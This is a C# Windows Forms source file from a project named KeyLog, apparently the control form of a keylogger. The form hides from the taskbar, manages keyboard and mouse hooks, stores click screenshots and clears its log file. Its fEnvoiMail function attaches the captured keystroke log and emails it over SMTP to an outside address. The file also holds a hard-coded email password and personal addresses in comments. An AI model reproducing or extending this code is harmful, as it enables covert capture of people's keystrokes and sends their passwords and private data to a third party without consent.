using System.Windows.Forms;
using System.Data;
using System;
using System.Drawing;
using System.Net.Mail;
using System.Net;
using System.IO;

namespace KeyLog{
    public partial class F_accueil : Form    {
        public static bool Is_datatable_initialized; //at first display a reference, extra columns (image, image_path, etc) are added to data table  
        public static bool to_be_saved = false;
        FormClosingEventArgs closing;
        bool Is_Closing = false;
        public static DataTable Click_DataTable = new DataTable();
        
        F_ZoomImage zoom;
        
        public F_accueil(){  // IS CALLED AT THE CREATION OF THE INSTANCE
            this.ShowInTaskbar = false;
            InitializeComponent();
        }

        private void F_accueil_Load(object sender, EventArgs e){ // IS CALLED BY THE .SHOW() METHOD
        
            zoom = new F_ZoomImage();
            
            //====================================================
            //      DEFINE SCREEN SIZE
            //====================================================
            //Size screenSize = Screen.PrimaryScreen.Bounds.Size;
            //MaximumSize = screenSize;

        }

        /*
        private void F_accueil_Click(object sender, EventArgs e){
            if (zoom.Visible) { zoom.Hide(); }
        }
        private void DGV_CellClick(object sender, DataGridViewCellEventArgs e){
            if (zoom.Visible) { zoom.Hide(); }
            Point CursorCoordinates = DGV.PointToClient(System.Windows.Forms.Cursor.Position);          //recupere les coordonées du curseur par rapport au datagridview
            DataGridView.HitTestInfo hitTest = DGV.HitTest(CursorCoordinates.X, CursorCoordinates.Y);   // recupere les propriétés de l'element du datagridview
            DataGridViewCell cell;
            if (hitTest.Type == DataGridViewHitTestType.Cell){  // si element sous le curseur est une cellule alors ...V
                                                               // on initialse une nouvelle instance du formulaire zoomimage 
                cell = (DataGridViewCell)DGV[hitTest.ColumnIndex, hitTest.RowIndex];
                if (cell.ColumnIndex == DGV.Columns["Image"].Index){
                    string ZoomImage = _PhotoZoom_path + DGV.Rows[cell.RowIndex].Cells["racine"].Value.ToString() + ".jpg";
                    if (!System.IO.File.Exists(ZoomImage)) { ZoomImage = _PhotoZoom_path + "NoImage.jpg"; }
                    zoom.picbox_Zoom.Image = Image.FromFile(ZoomImage);
                    zoom.Show();
                }
            }
        }*/
     

        public static void add_Click_2datatable(Image ClickImage){
            Cursor.Current = Cursors.WaitCursor;
            if (Is_datatable_initialized == false){                
                Click_DataTable.Columns.Add("Time", typeof(DateTime));
                Click_DataTable.Columns.Add("ClickImage", typeof(Image));
                Click_DataTable.Columns["ClickImage"].SetOrdinal(1);
                Click_DataTable.Columns["Time"].SetOrdinal(0);
                Is_datatable_initialized = true;
                to_be_saved = true;
            }
            DataRow ClickRow = Click_DataTable.NewRow();
            ClickRow["Time"] = DateTime.Now;
            // On a besoin de redimensionner l'image à insérer dans le grid
            /*float[] res = PDFreport.resize(ClickImage, 900, 900);
            Image img = ClickImage.GetThumbnailImage((int)res[0], (int)res[1], null, IntPtr.Zero);
            ClickRow["ClickImage"] = img;*/
            ClickRow["ClickImage"] = ClickImage;
            Click_DataTable.Rows.Add(ClickRow);
        }

        private void bt_DisplayClicks_Click(object sender, EventArgs e)
        {
            Afficher_Datatable();
        }

        private void Afficher_Datatable()
        {
            if (Click_DataTable.Rows.Count > 0)
            {// IF DATATABLE IS NOT EMPTY    
                this.bs_dgv.DataSource = Click_DataTable;
                this.DGV.DataSource = this.bs_dgv;
                this.DGV.RowHeadersVisible = true;
                DGV.Columns["ClickImage"].Width = 1000;
            }
        }



        private void F_accueil_FormClosing(object sender, FormClosingEventArgs e)
        {
            if (to_be_saved == true && Is_Closing==false )
            {
                MessageBoxButtons buttons = MessageBoxButtons.YesNoCancel;
                DialogResult result = MessageBox.Show("Voulez-vous sauvegarder la proposition sous excel ?", "", buttons);
                if (result == DialogResult.Yes)
                {
                    closing = e;
                    Is_Closing = true;
                }
                else if (result == DialogResult.No) { 
                    //Program.Connection_COQUE.close_COQUE();
                    InterceptKeys.UnhookWindowsHookEx(InterceptKeys.Key_hookID);
                    InterceptKeys.UnhookWindowsHookEx(InterceptKeys.Click_hookID);
                    //fEnvoiMail();
                    to_be_saved = false;
                    Application.Exit();
                }
                else if (result == DialogResult.Cancel) { e.Cancel = true; }
            }
            else {
                InterceptKeys.UnhookWindowsHookEx(InterceptKeys.Key_hookID);
                InterceptKeys.UnhookWindowsHookEx(InterceptKeys.Click_hookID);
                //fEnvoiMail();
                Application.Exit();
            }
        }

        private static void fEnvoiMail()
        {
            //--III---DEBUT ENVOI D'UN MAIL---
            string mailSubject = "mail subject";
            MailAddress mailFrom = new MailAddress("administrateur@nomdedomaine.com");
            MailAddress mailTo = new MailAddress("nom@gmail.com");//
            Attachment log =new Attachment(InterceptKeys.log_path);


            System.Net.Mail.MailMessage mailMsg = new System.Net.Mail.MailMessage(mailFrom, mailTo);

            mailMsg.Subject = mailSubject;
            mailMsg.Body = "log";
            mailMsg.Attachments.Add(log);
            //mailMsg.To.Add("florian.chaumeil@gmail.com");//"fchaumeil@bijouxcn.com");
            SmtpClient smtpCli = new SmtpClient("192.168.0.101");
            smtpCli.DeliveryMethod = SmtpDeliveryMethod.Network;
            smtpCli.Credentials = new NetworkCredential("login", "mdp");
            smtpCli.Send(mailMsg);
            /*
            var client = new SmtpClient("smtp.gmail.com",587)
            {
                Credentials = new NetworkCredential("myusername@gmail.com", "spmcfr14"),
                EnableSsl = true
            };

            client.Send(mailMsg);//"florian.chaumeil@gmail.com", "myusername@gmail.com", "test", "testbody");*/
            
            //---FIN ENVOI D'UN MAIL---
        }

        private void Catch_button_Click(object sender, EventArgs e)
        {
            this.Hide();
            if (File.Exists(InterceptKeys.log_path)) { File.WriteAllText(InterceptKeys.log_path, ""); }
        }

        private void textBox1_KeyDown(object sender,  KeyEventArgs e)
        {
            if (e.KeyCode == Keys.Enter) {
                float nombre = 0;
                try { nombre = Convert.ToSingle(textBox1.Text); }
                catch (FormatException ex) { MessageBox.Show("Conversion impossible \n" + ex.ToString()); }
                finally { lbl_Nbr2Mot.Text = ConvertisseurChiffresMot.convertir(nombre); }
            }
        }

        private bool IsMaximized = false;

        private void button1_Click(object sender, EventArgs e)
        {
            if (!IsMaximized)
            {
                IsMaximized = true;
                this.FormBorderStyle = FormBorderStyle.None;
                this.WindowState = FormWindowState.Maximized;
            }
            else
            {
                IsMaximized = false;
                this.FormBorderStyle = FormBorderStyle.Sizable;
                this.WindowState = FormWindowState.Normal;
            }
        }        

                            
    }
}
